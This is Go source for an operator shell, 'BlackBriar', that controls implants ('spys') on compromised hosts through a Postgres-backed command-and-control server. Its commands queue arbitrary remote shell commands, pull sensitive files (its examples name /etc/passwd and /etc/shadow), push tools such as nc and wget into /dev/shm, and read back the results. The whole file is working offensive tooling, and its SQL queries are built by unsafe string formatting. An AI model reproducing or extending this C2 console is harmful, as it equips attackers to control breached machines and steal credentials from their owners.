package main

import (
	"database/sql"
	b64 "encoding/base64"
	"flag"
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/common-nighthawk/go-figure"
	"github.com/jedib0t/go-pretty/table"
	_ "github.com/lib/pq"
	"gopkg.in/yaml.v2"
	"log"
	"os"
	"strconv"
	"strings"
	"time"
)

// Human readable date format
const human string = "2006-01-02 15:04:05"

// Database connection
var db *sql.DB

// Configuration file
var cfg Config

// Configuration file struct
type Config struct {
	Database struct {
		Dbhost string 	`yaml:"host"`
		Dbport int	`yaml:"port"`
		Dbuser string 	`yaml:"user"`
		Dbpass string 	`yaml:"pass"`
		Dbname string 	`yaml:"name"`
		Dbmode string 	`yaml:"mode"`
	} `yaml:"database"`
}

// Active spy holder
var active = ""

var LivePrefixState struct {
	livePrefix string
	isEnable   bool
}

// Spy schedule object
type SpyIdentity struct {
	Id 		int 	`db:"id"`
	Targ 		string 	`db:"targ"`
	Arch 	string 	`db:"arch"`
	Os 		string 	`db:"os"`
	Secret          string  `db:"secret"`
	Calls	        string  `db:"calls"`
	Ring          	string 	`db:"ring"`
	FirstSeen 	int64 	`db:"firstSeen"`
	LastSeen 	int64 	`db:"lastSeen"`
}

// Spy schedule object
type SpySchedule struct {
	Id 		int 	`db:"id"`
	Targ 		string 	`db:"targ"`
	Command 	string 	`db:"command"`
	Job             int     `db:"job"`
	Status 		string 	`db:"status"`
	TaskDate 	int64 	`db:"taskDate"`
	CompleteDate 	int64 	`db:"completeDate"`
	Complete 	bool 	`db:"complete"`
}

// Spy struct for posting results
type Result struct {
	Targ   	string `json:"targ"`
	JobId  	int    `json:"jobId"`
	Output 	string `json:"output"`
}

func main() {

	// Required: server and database configuration file
	var config = flag.String("c", "config.yml", "Configuration file")
	flag.Parse()

	initShell(*config)

	myFigure := figure.NewFigure("BlackBriar", "block", true)
	myFigure.Print()
	fmt.Println("v1.0")

	fmt.Println("\n[+] Starting shell...")
	fmt.Println("")

	p := prompt.New(
		executor,
		completer,
		prompt.OptionPrefix("Borne -> "),
		prompt.OptionLivePrefix(changeLivePrefix),
		prompt.OptionTitle("BlackBriar"),
	)
	p.Run()
}

// Error function
func processError(err error) {
	fmt.Println(err)
	os.Exit(2)
}

// Initialize the shell, read variables from yaml and connect to db
func initShell(c string) {
	// Read server configuration
	f, err := os.Open(c)
	if err != nil {
		fmt.Println("[!] Missing configuration file.")
		os.Exit(3)
	}
	defer f.Close()

	decoder := yaml.NewDecoder(f)
	err = decoder.Decode(&cfg)
	if err != nil {
		fmt.Println("[!] Error reading configuration file.")
		os.Exit(3)
	}

	// Connect to database
	connect()
}

func getEpochTime() int64 {
	return time.Now().Unix()
}

func changeLivePrefix() (string, bool) {
	return LivePrefixState.livePrefix, LivePrefixState.isEnable
}

func checkLiveAndActive() bool {
	if LivePrefixState.isEnable && active != "" {
		return true
	} else {
		return false
	}
}

func scheduleSpyWithJob(c string) SpySchedule {
	schedule := SpySchedule{
		Targ:         active,
		Command:      c,
		Status:       "Scheduled",
		TaskDate:     getEpochTime(),
		CompleteDate: 0,
		Complete:     false,
	}
	return schedule
}

func executor(in string) {
	c := strings.Split(in, " ")

	if len(c) < 1 {
		fmt.Println("[!] Missing command")
		return
	}

	cmd := strings.TrimSpace(c[0])

	switch cmd {
	case "scheduled":
		if checkLiveAndActive() && len(c) == 1 {
			ShowScheduledJobs(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an spy. Takes 0 arguments.")
		}
	case "spy":
		if len(c) == 1 {
			LivePrefixState.isEnable = false
			LivePrefixState.livePrefix = in
			active = ""

			ShowSpys()
		} else if len(c) == 2 {
			e := CheckSpyExists(strings.TrimSpace(c[1]))
			if e {
				LivePrefixState.livePrefix = strings.TrimSpace(c[1]) + "> "
				LivePrefixState.isEnable = true
				active = c[1]
			} else {
				fmt.Println("[!] Spy not found")
			}
		} else {
			fmt.Println("[!] Invalid command. ")
		}
	case "spys":
		if len(c) == 1 {
			ShowSpys()
		} else {
			fmt.Println("[!] Invalid command. Takes 0 arguments.")
		}
	case "kill":
		if checkLiveAndActive() && len(c) == 1 {
			schedule := scheduleSpyWithJob(strings.TrimSpace(c[0]))
			AddSpySchedule(schedule)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an spy. Takes 0 arguments.")
		}
	case "schedule":
		if checkLiveAndActive() && len(c) > 2 {
			schedule := scheduleSpyWithJob(strings.Join(c[1:], " "))
			AddSpySchedule(schedule)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an spy. Takes shell + shell command")
			fmt.Println("Example: schedule /bin/bash ls -la || schedule /bin/sh ps -efH")
		}
	case "info":
		if checkLiveAndActive() && len(c) == 1 {
			ShowSpyInfo(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an spy. Takes 0 arguments.")
		}
	case "jobs":
		if checkLiveAndActive() && len(c) == 1 {
			ShowSpyJobs(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an spy. Takes 0 arguments.")
		}
	case "job":
		if checkLiveAndActive() && len(c) == 2 {
			x, err := strconv.Atoi(c[1])
			if err != nil {
				fmt.Println("[!] Invalid job id")
				return
			}
			e := CheckJobExists(x, active)
			if e {
				ShowJobResult(x, active)
			} else {
				fmt.Println("[!] Job not found for spy")
			}
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an spy. Takes job + id")
			fmt.Println("Example: job 2 || job 10")
		}
	case "forget":
		if !checkLiveAndActive() && len(c) == 3 && strings.TrimSpace(c[1]) == "spy" {
			e := CheckSpyExists(strings.TrimSpace(c[2]))
			if e {
				forgetSpy(active)
			} else {
				fmt.Println("[!] Spy not found")
			}
		} else {
			fmt.Println("[!] Invalid command. Must not be tagged into an spy. Takes spy keyword + spy targ")
			fmt.Println("Example: forget spy A10000 || forget spy A10002")
		}
	case "set":
		if checkLiveAndActive() && len(c) == 3 && (strings.TrimSpace(c[1]) == "calls" || strings.TrimSpace(c[1]) == "ring") {
			x, err := strconv.Atoi(c[2])
			if err != nil {
				fmt.Println("[!} Invalid interval")
				return
			}
			schedule := scheduleSpyWithJob(strings.Join(c[:], " "))
			AddSpySchedule(schedule)

			if strings.TrimSpace(c[1]) == "calls" {
				SetCalls(active, x)
			} else {
				SetRing(active, x)
			}
		} else {
			fmt.Println("[!] Invalid command. Must not be tagged into an spy. Takes type keyword + interval in (s)")
			fmt.Println("Example: set calls 300 || set ring 60")
		}
	case "flush":
		if checkLiveAndActive() && len(c) == 1 {
			FlushJobs(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an spy. Takes 0 arguments.")
		}
	case "revoke":
		if checkLiveAndActive() && len(c) == 1 {
			RevokeJobs(active)
		} else if len(c) == 2 && strings.TrimSpace(c[1]) == "reschedule"{
			RevokeRescheduleJobs(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an spy. Takes 0 arguments or keyword reschedule.")
			fmt.Println("Example: revoke || revoke reschedule")
		}
	case "fire":
		if checkLiveAndActive() && len(c) == 1 {
			FireSpyJobs(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an spy. Takes 0 arguments.")
		}
	case "pull":
		if checkLiveAndActive() && len(c) == 2 {
			schedule := scheduleSpyWithJob(strings.Join(c[:], " "))
			AddSpySchedule(schedule)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an spy. Takes remote file to pull.")
			fmt.Println("Example: pull /etc/passwd || pull /etc/shadow")
		}
	case "push":
		if checkLiveAndActive() && len(c) == 3 {
			f := checkFile(c[1])
			if !f {
				fmt.Println("[!] Could not find file to push!")
				return
			}
			schedule := scheduleSpyWithJob(strings.Join(c[:], " "))
			AddSpySchedule(schedule)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an spy. Takes local file + remote file.")
			fmt.Println("Example: push /tmp/nc /dev/shm/nc || push /tmp/wget /dev/shm/wget")
		}
	case "quit":
		fmt.Println("[->] Goodbye! Treadstone is after you")
		os.Exit(2)
	}
}

func completer(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "spy", Description: "Tag into an spy"},
		{Text: "spys", Description: "List available spys"},
		{Text: "job", Description: "Show output from an spy job"},
		{Text: "jobs", Description: "Show jobs for an spy"},
		{Text: "info", Description: "Show spy info"},
		{Text: "schedule", Description: "Schedule an spy"},
		{Text: "forget job", Description: "Remove a job from scheduleed jobs"},
		{Text: "forget spy", Description: "Remove an spy"},
		{Text: "fire", Description: "Fire schedules to spy"},
		{Text: "flush", Description: "Flush non-fired schedules"},
		{Text: "revoke", Description: "Revoke a fired schedule"},
		{Text: "revoke reschedule", Description: "Revoke a fired schedule and place in scheduled"},
		{Text: "set calls", Description: "Revoke a fired schedule"},
		{Text: "set ring", Description: "Revoke a fired schedule"},
		{Text: "scheduled", Description: "Display scheduled schedules for an spy"},
		{Text: "kill", Description: "Terminate the spy process"},
		{Text: "quit", Description: "Exit the shell"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}

func b64Decode(s string) string {
	x,_ := b64.StdEncoding.DecodeString(s)
	return string(x)
}

func b64Encode(s string) string {
	return b64.StdEncoding.EncodeToString([]byte(s))
}

func checkFile(s string) bool {
	if _, err := os.Stat(s); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

// Connect to postgres database
func connect() {
	connectionString := fmt.Sprintf("host=%s port=%d user=%s password=%s dbname=%s sslmode=%s",
		cfg.Database.Dbhost, cfg.Database.Dbport, cfg.Database.Dbuser, cfg.Database.Dbpass, cfg.Database.Dbname,
		cfg.Database.Dbmode)

	var err error
	db, err = sql.Open("postgres", connectionString)
	if err != nil {
		processError(err)
	}

	err = db.Ping()
	if err != nil {
		processError(err)
	}
}

// Exec Postgres database command
func exec(command string) {
	_, err := db.Exec(command)
	if err != nil {
		log.Fatal(err)
	}
}

// Add schedule to Postgres
func AddSpySchedule(a SpySchedule) {
	t := "INSERT INTO tasks (targ, command, status, taskDate, completeDate, complete) VALUES ('%s', '%s', '%s', %d, %d, %t);"
	command := fmt.Sprintf(t, a.Targ, a.Command, a.Status, a.TaskDate, a.CompleteDate, a.Complete)
	exec(command)
}

// Show available spys
func ShowSpys() {
	t := "SELECT * FROM spys ORDER BY lastSeen DESC;"
	command := fmt.Sprintf(t)
	rows, err := db.Query(command)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	x := table.NewWriter()
	x.SetOutputMirror(os.Stdout)
	x.AppendHeader(table.Row{"Id", "Spy", "Arch", "OS", "Secret", "Calls", "Ring", "First Seen", "Last Seen"})

	for rows.Next() {
		var a SpyIdentity
		err = rows.Scan(&a.Id, &a.Targ, &a.Arch, &a.Os, &a.Secret, &a.Calls, &a.Ring, &a.FirstSeen, &a.LastSeen)

		if err != nil {
			log.Fatal(err)
		}
		x.AppendRow([]interface{}{a.Id, a.Targ, a.Arch, a.Os, a.Secret, a.Calls, a.Ring,
			convertFromEpoch(a.FirstSeen), convertFromEpoch(a.LastSeen)})
	}
	x.Render()
}

func convertFromEpoch(i int64) string {
	t := time.Unix(i, 0)
	return t.Format(human)
}

// Show available spys
func ShowSpyInfo(n string) {
	t := "SELECT id,targ,arch,os,secret,calls,ring,firstSeen,lastSeen FROM spys WHERE targ='%s' LIMIT 1;"
	command := fmt.Sprintf(t, n)
	rows, err := db.Query(command)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	for rows.Next() {
		var a SpyIdentity
		err = rows.Scan(&a.Id, &a.Targ, &a.Arch, &a.Os, &a.Secret, &a.Calls, &a.Ring, &a.FirstSeen, &a.LastSeen)

		if err != nil {
			log.Fatal(err)
		}
		x := table.NewWriter()
		x.SetOutputMirror(os.Stdout)
		x.AppendHeader(table.Row{"Id", "Spy", "Arch", "OS", "Secret", "Calls", "Ring", "First Seen", "Last Seen"})
		x.AppendRow([]interface{}{a.Id, a.Targ, a.Arch, a.Os, a.Secret, a.Calls, a.Ring,
			convertFromEpoch(a.FirstSeen), convertFromEpoch(a.LastSeen)})
		x.Render()
	}
}

// Show available spys
func ShowSpyJobs(n string) {
	t := "SELECT job, targ, command, status, taskDate, completeDate, complete FROM tasks WHERE targ='%s' AND (status='Fired' OR status='Complete') ORDER BY job DESC LIMIT 10;"
	fmt.Println(n)
	command := fmt.Sprintf(t, n)
	rows, err := db.Query(command)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	x := table.NewWriter()
	x.SetOutputMirror(os.Stdout)
	x.AppendHeader(table.Row{"Id", "Spy", "Command", "Status", "Task Date", "Complete Date", "Complete"})
	for rows.Next() {
		var a SpySchedule
		err = rows.Scan(&a.Job, &a.Targ, &a.Command, &a.Status, &a.TaskDate, &a.CompleteDate, &a.Complete)

		if err != nil {
			log.Fatal(err)
		}

		x.AppendRow([]interface{}{a.Job, a.Targ, a.Command, a.Status, convertFromEpoch(a.TaskDate),
			convertFromEpoch(a.CompleteDate), a.Complete})
	}
	x.Render()
}

func ShowJobResult(j int, n string) {
	q := "SELECT output FROM results WHERE targ='%s' AND jobId=%d"
	command := fmt.Sprintf(q, n, j)
	row := db.QueryRow(command)

	var r Result
	switch err := row.Scan(&r.Output); err  {
	case sql.ErrNoRows:
		fmt.Println("[ERROR] Job results not found")
	case nil:
		fmt.Println("[+] Job Results:\n", b64Decode(strings.TrimSpace(r.Output)))
	default:
		fmt.Println("[ERROR] Job results not found")
	}

}

func CheckSpyExists(n string) bool {
	q := "SELECT exists (SELECT 1 from spys WHERE targ='%s' LIMIT 1)"
	command := fmt.Sprintf(q, n)
	row := db.QueryRow(command)

	var exists bool
	err := row.Scan(&exists)
	if err != nil {
		return false
	} else {
		return exists
	}
}

func CheckJobExists(i int, n string) bool {
	q := "SELECT exists (SELECT 1 from tasks WHERE targ='%s' AND job=%d LIMIT 1)"
	command := fmt.Sprintf(q, n, i)
	row := db.QueryRow(command)

	var exists bool
	err := row.Scan(&exists)
	if err != nil {
		return false
	} else {
		return exists
	}
}

func RemoveJob(i int, n string) {
	q := "DELETE FROM tasks WHERE targ='%s' AND job=%d LIMIT 1"
	command := fmt.Sprintf(q, n, i)
	exec(command)
}

func forgetSpy(n string) {
	q := "DELETE FROM tasks,spys,tokens,results WHERE targ='%s'"
	command := fmt.Sprintf(q, n)
	exec(command)
}

// Show available spys
func ShowScheduledJobs(n string) {
	t := "SELECT targ, job, command, status, taskDate, completeDate, complete FROM tasks WHERE targ='%s' AND status='Scheduled' ORDER BY taskDate DESC LIMIT 10;"
	command := fmt.Sprintf(t, n)
	rows, err := db.Query(command)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	x := table.NewWriter()
	x.SetOutputMirror(os.Stdout)
	x.AppendHeader(table.Row{"Id", "Spy", "Command", "Status", "Task Date", "Complete Date", "Complete"})
	for rows.Next() {
		var a SpySchedule
		err = rows.Scan(&a.Targ, &a.Job, &a.Command, &a.Status, &a.TaskDate, &a.CompleteDate, &a.Complete)

		if err != nil {
			log.Fatal(err)
		}

		x.AppendRow([]interface{}{a.Job, a.Targ, a.Command, a.Status, convertFromEpoch(a.TaskDate),
			convertFromEpoch(a.CompleteDate), a.Complete})
	}
	x.Render()
}

func SetCalls(n string, i int) {
	u := "UPDATE spys SET calls = %d WHERE targ = '%s'"
	c := fmt.Sprintf(u, i, n)
	exec(c)
}

func SetRing(n string, i int) {
	u := "UPDATE spys SET ring = %d WHERE targ = '%s'"
	c := fmt.Sprintf(u, i, n)
	exec(c)
}

func RevokeJobs(n string) {
	u := "DELETE FROM tasks WHERE targ='%s' AND status='Fired'"
	c := fmt.Sprintf(u, n)
	exec(c)
}

func RevokeRescheduleJobs(n string) {
	u := "UPDATE tasks SET status = 'Scheduled' WHERE targ='%s' AND status='Fired'"
	c := fmt.Sprintf(u, n)
	exec(c)
}

func FireSpyJobs(n string) {
	u := "UPDATE tasks SET status = 'Fired' WHERE targ='%s' AND status='Scheduled'"
	c := fmt.Sprintf(u, n)
	exec(c)
}

func FlushJobs(n string) {
	u := "DELETE FROM tasks WHERE targ='%s' AND status='Scheduled'"
	c := fmt.Sprintf(u, n)
	exec(c)
}

func DumpSpy(n string) {
	// TODO: Query all and write to outfile
}
